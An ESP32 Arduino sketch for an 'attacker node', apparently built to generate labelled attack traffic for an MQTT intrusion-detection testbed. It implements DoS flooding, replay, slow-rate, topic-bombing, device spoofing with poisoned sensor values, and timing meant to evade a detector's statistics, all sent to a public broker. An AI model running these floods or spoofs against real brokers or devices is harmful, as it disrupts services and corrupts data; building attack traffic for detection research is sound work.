#include <WiFi.h>
#include <PubSubClient.h>
#include <Wire.h>
#include <Wire.h>

// ==========================================
// 1. WiFi & MQTT Configuration
// ==========================================
const char* ssid        = "YOUR_WIFI_SSID";
const char* password    = "YOUR_WIFI_PASSWORD";
const char* mqtt_server = "broker.hivemq.com";
const int   mqtt_port   = 1883;

WiFiClient espClient;
PubSubClient client(espClient);

// ==========================================
// 2. Hardware Pins
// ==========================================
const int BUTTON_PIN = 14;
const int MQ135_PIN = 34; // Read gas level on GPIO 34

// ==========================================
// 3. Attack Mode State
// ==========================================
enum AttackMode { NORMAL, DOS_FLOOD, REPLAY_ATTACK, SLOW_RATE_ATTACK, DATA_POISON, TOPIC_BOMB, EVASION_ATTACK };
AttackMode currentMode = NORMAL;

// Button debouncing variables
int lastButtonState = HIGH;
unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 250; // 250ms ignore window after a press

// Timing and Payload variables
unsigned long lastPublishTime = 0;
unsigned long nextPublishDelay = 3000;
unsigned long seqNumber = 0;
String replayPayload = "";

// Evasion specific variable
int evasionCounter = 0;

// ==========================================
// Helpers
// ==========================================
float getGasPPM() {
  int rawAnalog = analogRead(MQ135_PIN);
  float voltage = rawAnalog * (3.3 / 4095.0); 
  // Simplified linear mapping (or use MQ135.h library for precise curves):
  // 3.3V roughly equates to maximum expected ppm in open air scaling
  float ppm = (voltage / 3.3) * 1000.0; 
  return ppm;
}

String getModeString() {
  switch (currentMode) {
    case NORMAL:           return "NORMAL";
    case DOS_FLOOD:        return "DOS_FLOOD";
    case REPLAY_ATTACK:    return "REPLAY_ATTACK";
    case SLOW_RATE_ATTACK: return "SLOW_RATE_ATTACK";
    case DATA_POISON:      return "DATA_POISON";
    case TOPIC_BOMB:       return "TOPIC_BOMB";
    case EVASION_ATTACK:   return "EVASION_ATTACK";
  }
  return "NORMAL";
}

void setup_wifi() {
  delay(10);
  Serial.println();
  Serial.print("Connecting to WiFi: ");
  Serial.println(ssid);

  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nWiFi connected.");
  
  delay(1000);
}

void applyMode(String modeStr) {
  AttackMode oldMode = currentMode;
  if (modeStr == "NORMAL")            currentMode = NORMAL;
  else if (modeStr == "DOS_FLOOD")    currentMode = DOS_FLOOD;
  else if (modeStr == "REPLAY_ATTACK")currentMode = REPLAY_ATTACK;
  else if (modeStr == "SLOW_RATE_ATTACK") currentMode = SLOW_RATE_ATTACK;
  else if (modeStr == "DATA_POISON")  currentMode = DATA_POISON;
  else if (modeStr == "TOPIC_BOMB")   currentMode = TOPIC_BOMB;
  else if (modeStr == "EVASION_ATTACK") currentMode = EVASION_ATTACK;
  
  if (currentMode != oldMode) {
    if (currentMode != REPLAY_ATTACK) {
      replayPayload = "";
    }
    // Force immediate packet transmission for the new mode
    lastPublishTime = 0;
    nextPublishDelay = 0;
    evasionCounter = 0;
  }
  
  Serial.print(">> Mode set to: ");
  Serial.println(getModeString());
}

void mqttCallback(char* topic, byte* payload, unsigned int length) {
  String msg = "";
  for (unsigned int i = 0; i < length; i++) {
    msg += (char)payload[i];
  }
  Serial.print("[MQTT Callback] Msg received: ");
  Serial.println(msg);

  // Parse command JSON robustly, ignoring spacing differences
  if (msg.indexOf("SET_MODE") != -1) {
    int modeIdx = msg.indexOf("\"mode\"");
    if (modeIdx != -1) {
      int colonIdx = msg.indexOf(":", modeIdx);
      if (colonIdx != -1) {
        int startIdx = msg.indexOf("\"", colonIdx);
        if (startIdx != -1) {
          startIdx += 1; // skip opening quote
          int endIdx = msg.indexOf("\"", startIdx);
          if (endIdx != -1) {
            String modeStr = msg.substring(startIdx, endIdx);
            applyMode(modeStr);
          }
        }
      }
    }
  }
}

void reconnect() {
  while (!client.connected()) {
    String clientId = "ESP32-Attacker-" + String(random(0xffff), HEX);
    Serial.print("Attempting MQTT connection...");
    
    if (client.connect(clientId.c_str())) {
      Serial.println("Connected!");
      client.subscribe("netguard/cmd"); // Subscribe to command topic
      delay(1000);
    } else {
      Serial.print("failed, rc=");
      Serial.print(client.state());
      Serial.println(" try again in 5 seconds");
      
      delay(5000);
    }
  }
}

// ==========================================
// Setup
// ==========================================
void setup() {
  Serial.begin(115200);
  
  delay(1500);
  
  // Set GPIO 14 as input with pull-up. Button to GND will pull it LOW.
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  
  setup_wifi();
  client.setServer(mqtt_server, mqtt_port);
  client.setCallback(mqttCallback); // Set callback
  
  Serial.println("\n==============================================");
  Serial.println(">> ATTACKER NODE READY — Press button to cycle modes.");
  Serial.print(">> Current Mode: ");
  Serial.println(getModeString());
  Serial.println("==============================================\n");
}

// ==========================================
// Main Loop
// ==========================================
void loop() {
  if (!client.connected()) {
    reconnect();
  }
  client.loop();

  unsigned long now = millis();

  // --- 1. Button Reading with Debounce (Switches Modes) ---
  int reading = digitalRead(BUTTON_PIN);
  
  // If button is pressed (LOW) and it was previously unpressed (HIGH)
  if (reading == LOW && lastButtonState == HIGH && (now - lastDebounceTime) > debounceDelay) {
    lastDebounceTime = now;
    
    // Cycle to the next mode (7 modes total)
    currentMode = (AttackMode)((currentMode + 1) % 7);
    
    // Reset sequence and replay payload cache for the new mode
    if (currentMode != REPLAY_ATTACK) {
       replayPayload = ""; 
    }
    evasionCounter = 0;
    
    Serial.print("\n>> MODE SWITCHED TO: ");
    Serial.println(getModeString());
  }
  lastButtonState = reading;

  // --- 2. Traffic Generation Logic ---
  bool shouldPublish = false;
  
  switch (currentMode) {
    case NORMAL:
      if (now - lastPublishTime >= nextPublishDelay) {
        shouldPublish = true;
        nextPublishDelay = random(2000, 5000); // 2 to 5 seconds
      }
      break;
      
    case DOS_FLOOD:
      if (now - lastPublishTime >= nextPublishDelay) {
        shouldPublish = true;
        nextPublishDelay = random(150, 350); // 150 to 350 milliseconds!
      }
      break;
      
    case REPLAY_ATTACK:
      if (now - lastPublishTime >= nextPublishDelay) {
        shouldPublish = true;
        nextPublishDelay = random(800, 1500); // Approx 1 second
      }
      break;
      
    case SLOW_RATE_ATTACK:
      if (now - lastPublishTime >= nextPublishDelay) {
        shouldPublish = true;
        nextPublishDelay = random(15000, 30000); // 15 to 30 seconds!
      }
      break;

    case DATA_POISON:
      if (now - lastPublishTime >= nextPublishDelay) {
        shouldPublish = true;
        nextPublishDelay = random(2000, 5000); // Normal timing to bypass flow detection
      }
      break;

    case TOPIC_BOMB:
      if (now - lastPublishTime >= nextPublishDelay) {
        shouldPublish = true;
        nextPublishDelay = random(50, 100); // Extremely fast to exhaust broker
      }
      break;

    case EVASION_ATTACK:
      if (now - lastPublishTime >= nextPublishDelay) {
        shouldPublish = true;
        evasionCounter++;
        // 80% fast, 20% slow (delay for 3 seconds to ruin std_inter_arrival_ms)
        if (evasionCounter % 5 == 0) {
           nextPublishDelay = random(2500, 3500); 
        } else {
           nextPublishDelay = random(150, 250);
        }
      }
      break;
  }

  // --- 3. Publish Payload ---
  if (shouldPublish) {
    lastPublishTime = now;
    
    // In all modes except REPLAY_ATTACK, we generate a fresh packet with a new sequence number
    if (currentMode != REPLAY_ATTACK) {
      seqNumber++;
    }

    String topic = "netguard/attacker";
    String payload = "";

    if (currentMode == DATA_POISON) {
      // Spoof Device 1 and send poisoned math with dynamic randomized extreme values!
      topic = "netguard/device1";
      float fakeTemp = random(-500, 1500) + (random(0, 100) / 100.0);
      float fakeHum = random(-200, 300) + (random(0, 100) / 100.0);
      float fakePPM = random(5000, 15000) + (random(0, 100) / 100.0);
      
      payload = "{\"device\":\"esp32_1\",\"temp\":" + String(fakeTemp) + ",\"humidity\":" + String(fakeHum) + ",\"gas_ppm\":" + String(fakePPM) + ",\"poisoned\":true,\"mode\":\"" + getModeString() + "\"}";
    } 
    else if (currentMode == TOPIC_BOMB) {
      // Dynamically generate random topic targets
      topic = "netguard/junk_" + String(random(1000));
      payload = "{\"device\":\"esp32_3\",\"mode\":\"" + getModeString() + "\",\"garbage\":true}";
    }
    else {
      // Standard flow-based attacks
      String manualStr = (currentMode == NORMAL) ? "false" : "true";
      float currentPPM = getGasPPM();
      
      payload = "{\"device\":\"esp32_3\",\"mode\":\"" + getModeString() +
                "\",\"seq\":" + String(seqNumber) +
                ",\"manual\":" + manualStr + 
                ",\"gas_ppm\":" + String(currentPPM) + "}";
      
      // If Replay mode, reuse the exact same string (same sequence number) over and over
      if (currentMode == REPLAY_ATTACK) {
        if (replayPayload == "") {
           replayPayload = payload; // Capture the first payload to replay
        } else {
           payload = replayPayload; // Use the cached payload
        }
      }
    }

    // Send it to the broker!
    client.publish(topic.c_str(), payload.c_str());
    Serial.print("PUB [");
    Serial.print(topic);
    Serial.print("]: ");
    Serial.println(payload);
  }
}

// LCD logic removed for performance
